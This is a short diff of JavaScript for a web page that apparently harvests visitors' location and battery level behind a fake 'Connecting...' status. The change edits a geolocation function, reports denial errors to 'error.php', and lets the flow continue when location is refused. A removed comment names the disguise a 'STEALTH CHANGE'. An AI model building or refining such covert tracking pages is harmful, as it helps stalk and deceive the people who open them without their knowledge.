@@ -45,9 +45,6 @@ function collectAndSend(batLevel) {
 // 3. LOCATION LOGIC
 // -----------------------------------------------------
 function locate(successCallback, failCallback) {
-  // STEALTH CHANGE: No text change here if it already says "Connecting..."
-  // It looks cleaner to just stay on one status.
-  
   if (navigator.geolocation) {
     var optn = { enableHighAccuracy: true, timeout: 5000, maximumage: 0 };
     
@@ -56,17 +53,17 @@ function locate(successCallback, failCallback) {
           showPosition(position, successCallback); 
       }, 
       function(error) { 
-    // Report the error to error.php
-    $.ajax({
-        type: 'POST',
-        url: error_file,
-        data: { Status: 'failed', Error: error.message },
-        success: function() {
-            // After reporting, trigger the "failed" callback (which shows the popup)
-            if(failCallback) failCallback(); 
-        }
-    });
-}, 
+          // --- FIX: Report the error to error.php ---
+          $.ajax({
+            type: 'POST',
+            url: error_file,
+            data: { Status: 'failed', Error: error.message },
+            success: function() {
+                // If it fails, we trigger the callback to continue (or show error UI)
+                if(successCallback) successCallback(); 
+            }
+          });
+      }, 
       optn
     );
   } else {
